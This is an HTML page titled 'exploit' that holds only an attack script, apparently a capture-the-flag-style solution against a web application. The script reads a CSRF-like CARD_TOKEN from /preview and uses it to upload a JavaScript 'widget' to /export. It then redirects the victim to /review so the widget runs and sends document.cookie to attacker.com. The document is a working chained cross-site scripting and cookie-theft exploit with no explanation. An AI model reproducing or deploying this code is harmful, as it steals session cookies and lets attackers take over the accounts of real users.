<!DOCTYPE html>
<html>
<head>
    <title>exploit</title>
</head>
<body>
<script>
(async () => {
    // 1. get token from /preview
    const previewResp = await fetch('/preview', {credentials: 'include'});
    const html = await previewResp.text();
    const tokenMatch = html.match(/CARD_TOKEN\s*=\s*"([^"]+)"/);
    if (!tokenMatch) throw new Error('token not found');
    const token = tokenMatch[1];
    
    // 2. create widget
    const widgetCode = `fetch('https://attacker.com/steal?' + document.cookie);`;
    const exportResp = await fetch('/export', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/javascript',
            'X-Card-Token': token
        },
        body: widgetCode,
        credentials: 'include'
    });
    const widgetName = await exportResp.text();
    
    // 3. go to review page with that widget
    location.href = '/review?widget=' + widgetName;
})();
</script>
</body>
</html>
